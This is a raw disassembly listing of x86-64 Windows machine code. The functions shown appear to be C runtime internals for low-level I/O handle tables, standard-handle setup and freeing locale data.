   140008dfc:	48 8d b1 00 12 00 00 	lea    0x1200(%rcx),%rsi
   140008e03:	48 8b d9             	mov    %rcx,%rbx
   140008e06:	48 8b f9             	mov    %rcx,%rdi
   140008e09:	48 3b ce             	cmp    %rsi,%rcx
   140008e0c:	74 12                	je     0x140008e20
   140008e0e:	48 8b cf             	mov    %rdi,%rcx
   140008e11:	ff 15 e1 72 00 00    	call   *0x72e1(%rip)        # 0x1400100f8
   140008e17:	48 83 c7 48          	add    $0x48,%rdi
   140008e1b:	48 3b fe             	cmp    %rsi,%rdi
   140008e1e:	75 ee                	jne    0x140008e0e
   140008e20:	48 8b cb             	mov    %rbx,%rcx
   140008e23:	e8 24 de ff ff       	call   0x140006c4c
   140008e28:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140008e2d:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140008e32:	48 83 c4 20          	add    $0x20,%rsp
   140008e36:	5f                   	pop    %rdi
   140008e37:	c3                   	ret
   140008e38:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140008e3d:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140008e42:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   140008e47:	41 57                	push   %r15
   140008e49:	48 83 ec 30          	sub    $0x30,%rsp
   140008e4d:	8b f1                	mov    %ecx,%esi
   140008e4f:	81 f9 00 20 00 00    	cmp    $0x2000,%ecx
   140008e55:	72 29                	jb     0x140008e80
   140008e57:	e8 58 dd ff ff       	call   0x140006bb4
   140008e5c:	bb 09 00 00 00       	mov    $0x9,%ebx
   140008e61:	89 18                	mov    %ebx,(%rax)
   140008e63:	e8 10 dc ff ff       	call   0x140006a78
   140008e68:	8b c3                	mov    %ebx,%eax
   140008e6a:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140008e6f:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   140008e74:	48 8b 7c 24 50       	mov    0x50(%rsp),%rdi
   140008e79:	48 83 c4 30          	add    $0x30,%rsp
   140008e7d:	41 5f                	pop    %r15
   140008e7f:	c3                   	ret
   140008e80:	33 ff                	xor    %edi,%edi
   140008e82:	8d 4f 07             	lea    0x7(%rdi),%ecx
   140008e85:	e8 e2 fd ff ff       	call   0x140008c6c
   140008e8a:	90                   	nop
   140008e8b:	8b df                	mov    %edi,%ebx
   140008e8d:	8b 05 9d 2b 01 00    	mov    0x12b9d(%rip),%eax        # 0x14001ba30
   140008e93:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140008e98:	3b f0                	cmp    %eax,%esi
   140008e9a:	7c 36                	jl     0x140008ed2
   140008e9c:	4c 8d 3d 8d 27 01 00 	lea    0x1278d(%rip),%r15        # 0x14001b630
   140008ea3:	49 39 3c df          	cmp    %rdi,(%r15,%rbx,8)
   140008ea7:	74 02                	je     0x140008eab
   140008ea9:	eb 22                	jmp    0x140008ecd
   140008eab:	e8 90 fe ff ff       	call   0x140008d40
   140008eb0:	49 89 04 df          	mov    %rax,(%r15,%rbx,8)
   140008eb4:	48 85 c0             	test   %rax,%rax
   140008eb7:	75 05                	jne    0x140008ebe
   140008eb9:	8d 78 0c             	lea    0xc(%rax),%edi
   140008ebc:	eb 14                	jmp    0x140008ed2
   140008ebe:	8b 05 6c 2b 01 00    	mov    0x12b6c(%rip),%eax        # 0x14001ba30
   140008ec4:	83 c0 40             	add    $0x40,%eax
   140008ec7:	89 05 63 2b 01 00    	mov    %eax,0x12b63(%rip)        # 0x14001ba30
   140008ecd:	48 ff c3             	inc    %rbx
   140008ed0:	eb c1                	jmp    0x140008e93
   140008ed2:	b9 07 00 00 00       	mov    $0x7,%ecx
   140008ed7:	e8 e4 fd ff ff       	call   0x140008cc0
   140008edc:	8b c7                	mov    %edi,%eax
   140008ede:	eb 8a                	jmp    0x140008e6a
   140008ee0:	48 63 d1             	movslq %ecx,%rdx
   140008ee3:	4c 8d 05 46 27 01 00 	lea    0x12746(%rip),%r8        # 0x14001b630
   140008eea:	48 8b c2             	mov    %rdx,%rax
   140008eed:	83 e2 3f             	and    $0x3f,%edx
   140008ef0:	48 c1 f8 06          	sar    $0x6,%rax
   140008ef4:	48 8d 0c d2          	lea    (%rdx,%rdx,8),%rcx
   140008ef8:	49 8b 04 c0          	mov    (%r8,%rax,8),%rax
   140008efc:	48 8d 0c c8          	lea    (%rax,%rcx,8),%rcx
   140008f00:	48 ff 25 e1 71 00 00 	rex.W jmp *0x71e1(%rip)        # 0x1400100e8
   140008f07:	cc                   	int3
   140008f08:	48 63 d1             	movslq %ecx,%rdx
   140008f0b:	4c 8d 05 1e 27 01 00 	lea    0x1271e(%rip),%r8        # 0x14001b630
   140008f12:	48 8b c2             	mov    %rdx,%rax
   140008f15:	83 e2 3f             	and    $0x3f,%edx
   140008f18:	48 c1 f8 06          	sar    $0x6,%rax
   140008f1c:	48 8d 0c d2          	lea    (%rdx,%rdx,8),%rcx
   140008f20:	49 8b 04 c0          	mov    (%r8,%rax,8),%rax
   140008f24:	48 8d 0c c8          	lea    (%rax,%rcx,8),%rcx
   140008f28:	48 ff 25 c1 71 00 00 	rex.W jmp *0x71c1(%rip)        # 0x1400100f0
   140008f2f:	cc                   	int3
   140008f30:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140008f35:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140008f3a:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   140008f3f:	41 56                	push   %r14
   140008f41:	48 83 ec 20          	sub    $0x20,%rsp
   140008f45:	48 63 d9             	movslq %ecx,%rbx
   140008f48:	85 c9                	test   %ecx,%ecx
   140008f4a:	78 72                	js     0x140008fbe
   140008f4c:	3b 1d de 2a 01 00    	cmp    0x12ade(%rip),%ebx        # 0x14001ba30
   140008f52:	73 6a                	jae    0x140008fbe
   140008f54:	48 8b c3             	mov    %rbx,%rax
   140008f57:	4c 8d 35 d2 26 01 00 	lea    0x126d2(%rip),%r14        # 0x14001b630
   140008f5e:	83 e0 3f             	and    $0x3f,%eax
   140008f61:	48 8b f3             	mov    %rbx,%rsi
   140008f64:	48 c1 ee 06          	shr    $0x6,%rsi
   140008f68:	48 8d 3c c0          	lea    (%rax,%rax,8),%rdi
   140008f6c:	49 8b 04 f6          	mov    (%r14,%rsi,8),%rax
   140008f70:	f6 44 f8 38 01       	testb  $0x1,0x38(%rax,%rdi,8)
   140008f75:	74 47                	je     0x140008fbe
   140008f77:	48 83 7c f8 28 ff    	cmpq   $0xffffffffffffffff,0x28(%rax,%rdi,8)
   140008f7d:	74 3f                	je     0x140008fbe
   140008f7f:	e8 f0 ba ff ff       	call   0x140004a74
   140008f84:	83 f8 01             	cmp    $0x1,%eax
   140008f87:	75 27                	jne    0x140008fb0
   140008f89:	85 db                	test   %ebx,%ebx
   140008f8b:	74 16                	je     0x140008fa3
   140008f8d:	2b d8                	sub    %eax,%ebx
   140008f8f:	74 0b                	je     0x140008f9c
   140008f91:	3b d8                	cmp    %eax,%ebx
   140008f93:	75 1b                	jne    0x140008fb0
   140008f95:	b9 f4 ff ff ff       	mov    $0xfffffff4,%ecx
   140008f9a:	eb 0c                	jmp    0x140008fa8
   140008f9c:	b9 f5 ff ff ff       	mov    $0xfffffff5,%ecx
   140008fa1:	eb 05                	jmp    0x140008fa8
   140008fa3:	b9 f6 ff ff ff       	mov    $0xfffffff6,%ecx
   140008fa8:	33 d2                	xor    %edx,%edx
   140008faa:	ff 15 50 72 00 00    	call   *0x7250(%rip)        # 0x140010200
   140008fb0:	49 8b 04 f6          	mov    (%r14,%rsi,8),%rax
   140008fb4:	48 83 4c f8 28 ff    	orq    $0xffffffffffffffff,0x28(%rax,%rdi,8)
   140008fba:	33 c0                	xor    %eax,%eax
   140008fbc:	eb 16                	jmp    0x140008fd4
   140008fbe:	e8 f1 db ff ff       	call   0x140006bb4
   140008fc3:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   140008fc9:	e8 c6 db ff ff       	call   0x140006b94
   140008fce:	83 20 00             	andl   $0x0,(%rax)
   140008fd1:	83 c8 ff             	or     $0xffffffff,%eax
   140008fd4:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140008fd9:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140008fde:	48 8b 7c 24 40       	mov    0x40(%rsp),%rdi
   140008fe3:	48 83 c4 20          	add    $0x20,%rsp
   140008fe7:	41 5e                	pop    %r14
   140008fe9:	c3                   	ret
   140008fea:	cc                   	int3
   140008feb:	cc                   	int3
   140008fec:	48 83 ec 28          	sub    $0x28,%rsp
   140008ff0:	83 f9 fe             	cmp    $0xfffffffe,%ecx
   140008ff3:	75 15                	jne    0x14000900a
   140008ff5:	e8 9a db ff ff       	call   0x140006b94
   140008ffa:	83 20 00             	andl   $0x0,(%rax)
   140008ffd:	e8 b2 db ff ff       	call   0x140006bb4
   140009002:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   140009008:	eb 4e                	jmp    0x140009058
   14000900a:	85 c9                	test   %ecx,%ecx
   14000900c:	78 32                	js     0x140009040
   14000900e:	3b 0d 1c 2a 01 00    	cmp    0x12a1c(%rip),%ecx        # 0x14001ba30
   140009014:	73 2a                	jae    0x140009040
   140009016:	48 63 c9             	movslq %ecx,%rcx
   140009019:	4c 8d 05 10 26 01 00 	lea    0x12610(%rip),%r8        # 0x14001b630
   140009020:	48 8b c1             	mov    %rcx,%rax
   140009023:	83 e1 3f             	and    $0x3f,%ecx
   140009026:	48 c1 e8 06          	shr    $0x6,%rax
   14000902a:	48 8d 14 c9          	lea    (%rcx,%rcx,8),%rdx
   14000902e:	49 8b 04 c0          	mov    (%r8,%rax,8),%rax
   140009032:	f6 44 d0 38 01       	testb  $0x1,0x38(%rax,%rdx,8)
   140009037:	74 07                	je     0x140009040
   140009039:	48 8b 44 d0 28       	mov    0x28(%rax,%rdx,8),%rax
   14000903e:	eb 1c                	jmp    0x14000905c
   140009040:	e8 4f db ff ff       	call   0x140006b94
   140009045:	83 20 00             	andl   $0x0,(%rax)
   140009048:	e8 67 db ff ff       	call   0x140006bb4
   14000904d:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   140009053:	e8 20 da ff ff       	call   0x140006a78
   140009058:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   14000905c:	48 83 c4 28          	add    $0x28,%rsp
   140009060:	c3                   	ret
   140009061:	cc                   	int3
   140009062:	cc                   	int3
   140009063:	cc                   	int3
   140009064:	8b 05 ba 25 01 00    	mov    0x125ba(%rip),%eax        # 0x14001b624
   14000906a:	b9 00 40 00 00       	mov    $0x4000,%ecx
   14000906f:	85 c0                	test   %eax,%eax
   140009071:	0f 44 c1             	cmove  %ecx,%eax
   140009074:	89 05 aa 25 01 00    	mov    %eax,0x125aa(%rip)        # 0x14001b624
   14000907a:	33 c0                	xor    %eax,%eax
   14000907c:	c3                   	ret
   14000907d:	cc                   	int3
   14000907e:	cc                   	int3
   14000907f:	cc                   	int3
   140009080:	48 8b c4             	mov    %rsp,%rax
   140009083:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140009087:	48 89 68 10          	mov    %rbp,0x10(%rax)
   14000908b:	48 89 70 18          	mov    %rsi,0x18(%rax)
   14000908f:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140009093:	41 56                	push   %r14
   140009095:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
   14000909c:	48 8d 48 88          	lea    -0x78(%rax),%rcx
   1400090a0:	ff 15 1a 70 00 00    	call   *0x701a(%rip)        # 0x1400100c0
   1400090a6:	45 33 f6             	xor    %r14d,%r14d
   1400090a9:	66 44 39 74 24 62    	cmp    %r14w,0x62(%rsp)
   1400090af:	0f 84 9a 00 00 00    	je     0x14000914f
   1400090b5:	48 8b 44 24 68       	mov    0x68(%rsp),%rax
   1400090ba:	48 85 c0             	test   %rax,%rax
   1400090bd:	0f 84 8c 00 00 00    	je     0x14000914f
   1400090c3:	48 63 18             	movslq (%rax),%rbx
   1400090c6:	48 8d 70 04          	lea    0x4(%rax),%rsi
   1400090ca:	bf 00 20 00 00       	mov    $0x2000,%edi
   1400090cf:	48 03 de             	add    %rsi,%rbx
   1400090d2:	39 38                	cmp    %edi,(%rax)
   1400090d4:	0f 4c 38             	cmovl  (%rax),%edi
   1400090d7:	8b cf                	mov    %edi,%ecx
   1400090d9:	e8 5a fd ff ff       	call   0x140008e38
   1400090de:	3b 3d 4c 29 01 00    	cmp    0x1294c(%rip),%edi        # 0x14001ba30
   1400090e4:	0f 4f 3d 45 29 01 00 	cmovg  0x12945(%rip),%edi        # 0x14001ba30
   1400090eb:	85 ff                	test   %edi,%edi
   1400090ed:	74 60                	je     0x14000914f
   1400090ef:	41 8b ee             	mov    %r14d,%ebp
   1400090f2:	48 83 3b ff          	cmpq   $0xffffffffffffffff,(%rbx)
   1400090f6:	74 47                	je     0x14000913f
   1400090f8:	48 83 3b fe          	cmpq   $0xfffffffffffffffe,(%rbx)
   1400090fc:	74 41                	je     0x14000913f
   1400090fe:	f6 06 01             	testb  $0x1,(%rsi)
   140009101:	74 3c                	je     0x14000913f
   140009103:	f6 06 08             	testb  $0x8,(%rsi)
   140009106:	75 0d                	jne    0x140009115
   140009108:	48 8b 0b             	mov    (%rbx),%rcx
   14000910b:	ff 15 f7 70 00 00    	call   *0x70f7(%rip)        # 0x140010208
   140009111:	85 c0                	test   %eax,%eax
   140009113:	74 2a                	je     0x14000913f
   140009115:	48 8b c5             	mov    %rbp,%rax
   140009118:	4c 8d 05 11 25 01 00 	lea    0x12511(%rip),%r8        # 0x14001b630
   14000911f:	48 8b cd             	mov    %rbp,%rcx
   140009122:	48 c1 f9 06          	sar    $0x6,%rcx
   140009126:	83 e0 3f             	and    $0x3f,%eax
   140009129:	49 8b 0c c8          	mov    (%r8,%rcx,8),%rcx
   14000912d:	48 8d 14 c0          	lea    (%rax,%rax,8),%rdx
   140009131:	48 8b 03             	mov    (%rbx),%rax
   140009134:	48 89 44 d1 28       	mov    %rax,0x28(%rcx,%rdx,8)
   140009139:	8a 06                	mov    (%rsi),%al
   14000913b:	88 44 d1 38          	mov    %al,0x38(%rcx,%rdx,8)
   14000913f:	48 ff c5             	inc    %rbp
   140009142:	48 ff c6             	inc    %rsi
   140009145:	48 83 c3 08          	add    $0x8,%rbx
   140009149:	48 83 ef 01          	sub    $0x1,%rdi
   14000914d:	75 a3                	jne    0x1400090f2
   14000914f:	4c 8d 9c 24 90 00 00 	lea    0x90(%rsp),%r11
   140009156:	00 
   140009157:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   14000915b:	49 8b 6b 18          	mov    0x18(%r11),%rbp
   14000915f:	49 8b 73 20          	mov    0x20(%r11),%rsi
   140009163:	49 8b 7b 28          	mov    0x28(%r11),%rdi
   140009167:	49 8b e3             	mov    %r11,%rsp
   14000916a:	41 5e                	pop    %r14
   14000916c:	c3                   	ret
   14000916d:	cc                   	int3
   14000916e:	cc                   	int3
   14000916f:	cc                   	int3
   140009170:	48 8b c4             	mov    %rsp,%rax
   140009173:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140009177:	48 89 68 10          	mov    %rbp,0x10(%rax)
   14000917b:	48 89 70 18          	mov    %rsi,0x18(%rax)
   14000917f:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140009183:	41 56                	push   %r14
   140009185:	48 83 ec 20          	sub    $0x20,%rsp
   140009189:	33 f6                	xor    %esi,%esi
   14000918b:	45 33 f6             	xor    %r14d,%r14d
   14000918e:	48 63 ce             	movslq %esi,%rcx
   140009191:	48 8d 3d 98 24 01 00 	lea    0x12498(%rip),%rdi        # 0x14001b630
   140009198:	48 8b c1             	mov    %rcx,%rax
   14000919b:	83 e1 3f             	and    $0x3f,%ecx
   14000919e:	48 c1 f8 06          	sar    $0x6,%rax
   1400091a2:	48 8d 1c c9          	lea    (%rcx,%rcx,8),%rbx
   1400091a6:	48 8b 3c c7          	mov    (%rdi,%rax,8),%rdi
   1400091aa:	48 8b 44 df 28       	mov    0x28(%rdi,%rbx,8),%rax
   1400091af:	48 83 c0 02          	add    $0x2,%rax
   1400091b3:	48 83 f8 01          	cmp    $0x1,%rax
   1400091b7:	76 0a                	jbe    0x1400091c3
   1400091b9:	80 4c df 38 80       	orb    $0x80,0x38(%rdi,%rbx,8)
   1400091be:	e9 8b 00 00 00       	jmp    0x14000924e
   1400091c3:	c6 44 df 38 81       	movb   $0x81,0x38(%rdi,%rbx,8)
   1400091c8:	8b ce                	mov    %esi,%ecx
   1400091ca:	85 f6                	test   %esi,%esi
   1400091cc:	74 16                	je     0x1400091e4
   1400091ce:	83 e9 01             	sub    $0x1,%ecx
   1400091d1:	74 0a                	je     0x1400091dd
   1400091d3:	83 f9 01             	cmp    $0x1,%ecx
   1400091d6:	b9 f4 ff ff ff       	mov    $0xfffffff4,%ecx
   1400091db:	eb 0c                	jmp    0x1400091e9
   1400091dd:	b9 f5 ff ff ff       	mov    $0xfffffff5,%ecx
   1400091e2:	eb 05                	jmp    0x1400091e9
   1400091e4:	b9 f6 ff ff ff       	mov    $0xfffffff6,%ecx
   1400091e9:	ff 15 69 6f 00 00    	call   *0x6f69(%rip)        # 0x140010158
   1400091ef:	48 8b e8             	mov    %rax,%rbp
   1400091f2:	48 8d 48 01          	lea    0x1(%rax),%rcx
   1400091f6:	48 83 f9 01          	cmp    $0x1,%rcx
   1400091fa:	76 2d                	jbe    0x140009229
   1400091fc:	48 8b c8             	mov    %rax,%rcx
   1400091ff:	ff 15 03 70 00 00    	call   *0x7003(%rip)        # 0x140010208
   140009205:	85 c0                	test   %eax,%eax
   140009207:	74 20                	je     0x140009229
   140009209:	0f b6 c0             	movzbl %al,%eax
   14000920c:	48 89 6c df 28       	mov    %rbp,0x28(%rdi,%rbx,8)
   140009211:	83 f8 02             	cmp    $0x2,%eax
   140009214:	75 07                	jne    0x14000921d
   140009216:	80 4c df 38 40       	orb    $0x40,0x38(%rdi,%rbx,8)
   14000921b:	eb 31                	jmp    0x14000924e
   14000921d:	83 f8 03             	cmp    $0x3,%eax
   140009220:	75 2c                	jne    0x14000924e
   140009222:	80 4c df 38 08       	orb    $0x8,0x38(%rdi,%rbx,8)
   140009227:	eb 25                	jmp    0x14000924e
   140009229:	80 4c df 38 40       	orb    $0x40,0x38(%rdi,%rbx,8)
   14000922e:	48 c7 44 df 28 fe ff 	movq   $0xfffffffffffffffe,0x28(%rdi,%rbx,8)
   140009235:	ff ff 
   140009237:	48 8b 05 ea 29 01 00 	mov    0x129ea(%rip),%rax        # 0x14001bc28
   14000923e:	48 85 c0             	test   %rax,%rax
   140009241:	74 0b                	je     0x14000924e
   140009243:	49 8b 04 06          	mov    (%r14,%rax,1),%rax
   140009247:	c7 40 18 fe ff ff ff 	movl   $0xfffffffe,0x18(%rax)
   14000924e:	ff c6                	inc    %esi
   140009250:	49 83 c6 08          	add    $0x8,%r14
   140009254:	83 fe 03             	cmp    $0x3,%esi
   140009257:	0f 85 31 ff ff ff    	jne    0x14000918e
   14000925d:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140009262:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140009267:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   14000926c:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   140009271:	48 83 c4 20          	add    $0x20,%rsp
   140009275:	41 5e                	pop    %r14
   140009277:	c3                   	ret
   140009278:	40 53                	rex push %rbx
   14000927a:	48 83 ec 20          	sub    $0x20,%rsp
   14000927e:	b9 07 00 00 00       	mov    $0x7,%ecx
   140009283:	e8 e4 f9 ff ff       	call   0x140008c6c
   140009288:	33 db                	xor    %ebx,%ebx
   14000928a:	33 c9                	xor    %ecx,%ecx
   14000928c:	e8 a7 fb ff ff       	call   0x140008e38
   140009291:	85 c0                	test   %eax,%eax
   140009293:	75 0c                	jne    0x1400092a1
   140009295:	e8 e6 fd ff ff       	call   0x140009080
   14000929a:	e8 d1 fe ff ff       	call   0x140009170
   14000929f:	b3 01                	mov    $0x1,%bl
   1400092a1:	b9 07 00 00 00       	mov    $0x7,%ecx
   1400092a6:	e8 15 fa ff ff       	call   0x140008cc0
   1400092ab:	8a c3                	mov    %bl,%al
   1400092ad:	48 83 c4 20          	add    $0x20,%rsp
   1400092b1:	5b                   	pop    %rbx
   1400092b2:	c3                   	ret
   1400092b3:	cc                   	int3
   1400092b4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400092b9:	57                   	push   %rdi
   1400092ba:	48 83 ec 20          	sub    $0x20,%rsp
   1400092be:	33 db                	xor    %ebx,%ebx
   1400092c0:	48 8d 3d 69 23 01 00 	lea    0x12369(%rip),%rdi        # 0x14001b630
   1400092c7:	48 8b 0c 3b          	mov    (%rbx,%rdi,1),%rcx
   1400092cb:	48 85 c9             	test   %rcx,%rcx
   1400092ce:	74 0a                	je     0x1400092da
   1400092d0:	e8 13 fb ff ff       	call   0x140008de8
   1400092d5:	48 83 24 3b 00       	andq   $0x0,(%rbx,%rdi,1)
   1400092da:	48 83 c3 08          	add    $0x8,%rbx
   1400092de:	48 81 fb 00 04 00 00 	cmp    $0x400,%rbx
   1400092e5:	72 d9                	jb     0x1400092c0
   1400092e7:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400092ec:	b0 01                	mov    $0x1,%al
   1400092ee:	48 83 c4 20          	add    $0x20,%rsp
   1400092f2:	5f                   	pop    %rdi
   1400092f3:	c3                   	ret
   1400092f4:	48 85 c9             	test   %rcx,%rcx
   1400092f7:	0f 84 00 01 00 00    	je     0x1400093fd
   1400092fd:	53                   	push   %rbx
   1400092fe:	48 83 ec 20          	sub    $0x20,%rsp
   140009302:	48 8b d9             	mov    %rcx,%rbx
   140009305:	48 8b 49 18          	mov    0x18(%rcx),%rcx
   140009309:	48 3b 0d 58 14 01 00 	cmp    0x11458(%rip),%rcx        # 0x14001a768
   140009310:	74 05                	je     0x140009317
   140009312:	e8 35 d9 ff ff       	call   0x140006c4c
   140009317:	48 8b 4b 20          	mov    0x20(%rbx),%rcx
   14000931b:	48 3b 0d 4e 14 01 00 	cmp    0x1144e(%rip),%rcx        # 0x14001a770
   140009322:	74 05                	je     0x140009329
   140009324:	e8 23 d9 ff ff       	call   0x140006c4c
   140009329:	48 8b 4b 28          	mov    0x28(%rbx),%rcx
   14000932d:	48 3b 0d 44 14 01 00 	cmp    0x11444(%rip),%rcx        # 0x14001a778
   140009334:	74 05                	je     0x14000933b
   140009336:	e8 11 d9 ff ff       	call   0x140006c4c
   14000933b:	48 8b 4b 30          	mov    0x30(%rbx),%rcx
   14000933f:	48 3b 0d 3a 14 01 00 	cmp    0x1143a(%rip),%rcx        # 0x14001a780
   140009346:	74 05                	je     0x14000934d
   140009348:	e8 ff d8 ff ff       	call   0x140006c4c
   14000934d:	48 8b 4b 38          	mov    0x38(%rbx),%rcx
   140009351:	48 3b 0d 30 14 01 00 	cmp    0x11430(%rip),%rcx        # 0x14001a788
   140009358:	74 05                	je     0x14000935f
   14000935a:	e8 ed d8 ff ff       	call   0x140006c4c
   14000935f:	48 8b 4b 40          	mov    0x40(%rbx),%rcx
   140009363:	48 3b 0d 26 14 01 00 	cmp    0x11426(%rip),%rcx        # 0x14001a790
   14000936a:	74 05                	je     0x140009371
   14000936c:	e8 db d8 ff ff       	call   0x140006c4c
   140009371:	48 8b 4b 48          	mov    0x48(%rbx),%rcx
   140009375:	48 3b 0d 1c 14 01 00 	cmp    0x1141c(%rip),%rcx        # 0x14001a798
   14000937c:	74 05                	je     0x140009383
   14000937e:	e8 c9 d8 ff ff       	call   0x140006c4c
   140009383:	48 8b 4b 68          	mov    0x68(%rbx),%rcx
   140009387:	48 3b 0d 2a 14 01 00 	cmp    0x1142a(%rip),%rcx        # 0x14001a7b8
   14000938e:	74 05                	je     0x140009395
   140009390:	e8 b7 d8 ff ff       	call   0x140006c4c
   140009395:	48 8b 4b 70          	mov    0x70(%rbx),%rcx
   140009399:	48 3b 0d 20 14 01 00 	cmp    0x11420(%rip),%rcx        # 0x14001a7c0
   1400093a0:	74 05                	je     0x1400093a7
   1400093a2:	e8 a5 d8 ff ff       	call   0x140006c4c
   1400093a7:	48 8b 4b 78          	mov    0x78(%rbx),%rcx
   1400093ab:	48 3b 0d 16 14 01 00 	cmp    0x11416(%rip),%rcx        # 0x14001a7c8
   1400093b2:	74 05                	je     0x1400093b9
   1400093b4:	e8 93 d8 ff ff       	call   0x140006c4c
   1400093b9:	48 8b 8b 80 00 00 00 	mov    0x80(%rbx),%rcx
   1400093c0:	48 3b 0d 09 14 01 00 	cmp    0x11409(%rip),%rcx        # 0x14001a7d0
   1400093c7:	74 05                	je     0x1400093ce
   1400093c9:	e8 7e d8 ff ff       	call   0x140006c4c
   1400093ce:	48 8b 8b 88 00 00 00 	mov    0x88(%rbx),%rcx
   1400093d5:	48 3b 0d fc 13 01 00 	cmp    0x113fc(%rip),%rcx        # 0x14001a7d8
   1400093dc:	74 05                	je     0x1400093e3
   1400093de:	e8 69 d8 ff ff       	call   0x140006c4c
   1400093e3:	48 8b 8b 90 00 00 00 	mov    0x90(%rbx),%rcx
   1400093ea:	48 3b 0d ef 13 01 00 	cmp    0x113ef(%rip),%rcx        # 0x14001a7e0
   1400093f1:	74 05                	je     0x1400093f8
   1400093f3:	e8 54 d8 ff ff       	call   0x140006c4c
   1400093f8:	48 83 c4 20          	add    $0x20,%rsp
   1400093fc:	5b                   	pop    %rbx
   1400093fd:	c3                   	ret
   1400093fe:	cc                   	int3
   1400093ff:	cc                   	int3
   140009400:	48 85 c9             	test   %rcx,%rcx
   140009403:	74 66                	je     0x14000946b
   140009405:	53                   	push   %rbx
   140009406:	48 83 ec 20          	sub    $0x20,%rsp
   14000940a:	48 8b d9             	mov    %rcx,%rbx
   14000940d:	48 8b 09             	mov    (%rcx),%rcx
   140009410:	48 3b 0d 39 13 01 00 	cmp    0x11339(%rip),%rcx        # 0x14001a750
   140009417:	74 05                	je     0x14000941e
   140009419:	e8 2e d8 ff ff       	call   0x140006c4c
   14000941e:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   140009422:	48 3b 0d 2f 13 01 00 	cmp    0x1132f(%rip),%rcx        # 0x14001a758
   140009429:	74 05                	je     0x140009430
   14000942b:	e8 1c d8 ff ff       	call   0x140006c4c
   140009430:	48 8b 4b 10          	mov    0x10(%rbx),%rcx
   140009434:	48 3b 0d 25 13 01 00 	cmp    0x11325(%rip),%rcx        # 0x14001a760
   14000943b:	74 05                	je     0x140009442
   14000943d:	e8 0a d8 ff ff       	call   0x140006c4c
   140009442:	48 8b 4b 58          	mov    0x58(%rbx),%rcx
   140009446:	48 3b 0d 5b 13 01 00 	cmp    0x1135b(%rip),%rcx        # 0x14001a7a8
   14000944d:	74 05                	je     0x140009454
   14000944f:	e8 f8 d7 ff ff       	call   0x140006c4c
   140009454:	48 8b 4b 60          	mov    0x60(%rbx),%rcx
   140009458:	48 3b 0d 51 13 01 00 	cmp    0x11351(%rip),%rcx        # 0x14001a7b0
   14000945f:	74 05                	je     0x140009466
   140009461:	e8 e6 d7 ff ff       	call   0x140006c4c
   140009466:	48 83 c4 20          	add    $0x20,%rsp
   14000946a:	5b                   	pop    %rbx
   14000946b:	c3                   	ret
   14000946c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140009471:	57                   	push   %rdi
   140009472:	48 83 ec 20          	sub    $0x20,%rsp
   140009476:	48 8d 3c d1          	lea    (%rcx,%rdx,8),%rdi
   14000947a:	48 8b d9             	mov    %rcx,%rbx
   14000947d:	48 3b cf             	cmp    %rdi,%rcx
   140009480:	74 11                	je     0x140009493
   140009482:	48 8b 0b             	mov    (%rbx),%rcx
   140009485:	e8 c2 d7 ff ff       	call   0x140006c4c
   14000948a:	48 83 c3 08          	add    $0x8,%rbx
   14000948e:	48 3b df             	cmp    %rdi,%rbx
   140009491:	75 ef                	jne    0x140009482
   140009493:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140009498:	48 83 c4 20          	add    $0x20,%rsp
   14000949c:	5f                   	pop    %rdi
   14000949d:	c3                   	ret
   14000949e:	cc                   	int3
   14000949f:	cc                   	int3
   1400094a0:	48 85 c9             	test   %rcx,%rcx
   1400094a3:	0f 84 fe 00 00 00    	je     0x1400095a7
   1400094a9:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400094ae:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1400094b3:	56                   	push   %rsi
   1400094b4:	48 83 ec 20          	sub    $0x20,%rsp
   1400094b8:	bd 07 00 00 00       	mov    $0x7,%ebp
   1400094bd:	48 8b d9             	mov    %rcx,%rbx
   1400094c0:	8b d5                	mov    %ebp,%edx
   1400094c2:	e8 a5 ff ff ff       	call   0x14000946c
   1400094c7:	48 8d 4b 38          	lea    0x38(%rbx),%rcx
   1400094cb:	8b d5                	mov    %ebp,%edx
   1400094cd:	e8 9a ff ff ff       	call   0x14000946c
   1400094d2:	8d 75 05             	lea    0x5(%rbp),%esi
   1400094d5:	8b d6                	mov    %esi,%edx
   1400094d7:	48 8d 4b 70          	lea    0x70(%rbx),%rcx
   1400094db:	e8 8c ff ff ff       	call   0x14000946c
   1400094e0:	48 8d 8b d0 00 00 00 	lea    0xd0(%rbx),%rcx
   1400094e7:	8b d6                	mov    %esi,%edx
   1400094e9:	e8 7e ff ff ff       	call   0x14000946c
   1400094ee:	48 8d 8b 30 01 00 00 	lea    0x130(%rbx),%rcx
   1400094f5:	8d 55 fb             	lea    -0x5(%rbp),%edx
   1400094f8:	e8 6f ff ff ff       	call   0x14000946c
